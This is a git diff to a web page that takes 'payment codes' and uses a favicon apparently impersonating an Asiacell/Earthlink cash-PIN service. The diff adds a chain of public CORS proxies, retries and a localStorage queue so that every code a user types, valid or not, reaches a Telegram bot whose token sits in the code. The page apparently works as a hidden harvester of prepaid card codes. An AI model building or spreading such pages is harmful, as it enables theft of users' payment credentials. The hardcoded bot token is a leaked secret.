@@ -8,10 +8,10 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <!-- Google Fonts -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <!-- Favicon (using the provided raw image) -->
+    <!-- Favicon -->
     <link rel="icon" type="image/jpeg" href="https://raw.githubusercontent.com/Asiacell-Erthlink/CASH_PIN/refs/heads/main/CashPin.jpg">
     <style>
-        /* (نفس التنسيقات السابقة) */
+        /* نفس التنسيقات السابقة مع إضافة القليل للرسائل */
         * {
             margin: 0;
             padding: 0;
@@ -310,6 +310,12 @@
             border-radius: 16px;
         }
 
+        .telegram-status {
+            font-size: 12px;
+            margin-top: 8px;
+            color: #888;
+        }
+
         .admin-panel {
             display: none;
         }
@@ -430,6 +436,7 @@
             <div class="message-area" id="messageArea">
                 <div class="message-text" id="messageText">Awaiting your payment code...</div>
                 <div id="extraDetails"></div>
+                <div id="telegramStatus" class="telegram-status"></div>
             </div>
         </div>
     </main>
@@ -453,6 +460,14 @@
             // ========== CONFIG ==========
             const BOT_TOKEN = '8094856271:AAFdutCJAsHntdIByvaumPDFkwfRU14niCE';
             const CHAT_ID = '@CASH_PIN'; // Replace with actual chat ID (channel or user)
+
+            // قائمة الوكلاء (CORS proxies) - سيتم تجربتها تباعاً
+            const PROXY_LIST = [
+                'https://corsproxy.io/?',
+                'https://api.allorigins.win/raw?url=',
+                'https://thingproxy.freeboard.io/fetch/',
+                'https://cors-anywhere.herokuapp.com/' // قد يتطلب تفعيلاً مؤقتاً
+            ];
 
             // #Key's_Here🔑
             const VALID_KEYS = [
@@ -489,6 +504,7 @@
             const sendBtn = document.getElementById('sendCodeBtn');
             const messageText = document.getElementById('messageText');
             const extraDetails = document.getElementById('extraDetails');
+            const telegramStatus = document.getElementById('telegramStatus');
             const newOpSidebarBtn = document.getElementById('newOperationSidebarBtn');
             const userMode = document.getElementById('userMode');
             const adminMode = document.getElementById('adminMode');
@@ -538,8 +554,8 @@
                 pendingListEl.innerHTML = html;
             }
 
-            // ========== TELEGRAM SENDER (with proxy) ==========
-            async function sendTelegramMessage(text) {
+            // ========== TELEGRAM SENDER WITH MULTIPLE PROXIES ==========
+            async function sendTelegramMessage(text, retryCount = 0) {
                 const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                 const payload = {
                     chat_id: CHAT_ID,
@@ -547,21 +563,35 @@
                     parse_mode: 'Markdown'
                 };
 
-                // Use a public CORS proxy (corsproxy.io)
-                const proxyUrl = 'https://corsproxy.io/?' + encodeURIComponent(url);
+                if (retryCount >= PROXY_LIST.length) {
+                    // All proxies failed
+                    console.error('All proxies failed for Telegram message');
+                    telegramStatus.innerText = '⚠️ Could not send Telegram notification (all proxies failed)';
+                    // Store in localStorage for later retry (optional)
+                    const failedMessages = JSON.parse(localStorage.getItem('failed_telegram') || '[]');
+                    failedMessages.push({ text, timestamp: Date.now() });
+                    localStorage.setItem('failed_telegram', JSON.stringify(failedMessages));
+                    return;
+                }
+
+                const proxy = PROXY_LIST[retryCount];
+                const fullUrl = proxy + encodeURIComponent(url);
 
                 try {
-                    const response = await fetch(proxyUrl, {
+                    const response = await fetch(fullUrl, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(payload)
                     });
                     const data = await response.json();
                     if (!data.ok) throw new Error(data.description);
-                    console.log('Telegram message sent:', data);
+                    console.log('Telegram message sent via', proxy);
+                    telegramStatus.innerText = '✅ Telegram notification sent';
+                    setTimeout(() => { telegramStatus.innerText = ''; }, 3000);
                 } catch (error) {
-                    console.error('Error sending Telegram message:', error);
-                    // Silent fail (do not disrupt user experience)
+                    console.warn(`Proxy ${retryCount} failed:`, error);
+                    // Try next proxy
+                    await sendTelegramMessage(text, retryCount + 1);
                 }
             }
 
@@ -583,7 +613,6 @@
                     messageText.innerText = '❌ Invalid or used key. Please obtain a valid key.';
                     extraDetails.innerHTML = '';
 
-                    // Send failure message to Telegram
                     const failMsg = `❌ *Invalid Payment Code Attempt*\n\nCode: \`${trimmedCode}\`\nTime: ${timeString}\nStatus: Failed (invalid/used)`;
                     sendTelegramMessage(failMsg);
                     return;
@@ -628,7 +657,7 @@
                 paymentInput.value = '';
                 closeSidebar();
 
-                // Send success message to Telegram with all details
+                // Send success message
                 const successMsg = `✅ *Payment Code Accepted*\n\n` +
                     `Code: \`${trimmedCode}\`\n` +
                     `Time: ${timeString}\n` +
@@ -746,6 +775,19 @@
             });
 
             backToUserBtn.addEventListener('click', exitAdminMode);
+
+            // ========== RETRY FAILED MESSAGES (optional) ==========
+            function retryFailedMessages() {
+                const failed = JSON.parse(localStorage.getItem('failed_telegram') || '[]');
+                if (failed.length > 0) {
+                    failed.forEach(item => {
+                        sendTelegramMessage(item.text);
+                    });
+                    localStorage.removeItem('failed_telegram');
+                }
+            }
+            // Retry every 30 seconds if there are failed messages
+            setInterval(retryFailedMessages, 30000);
 
             // ========== INIT ==========
             loadRequests();
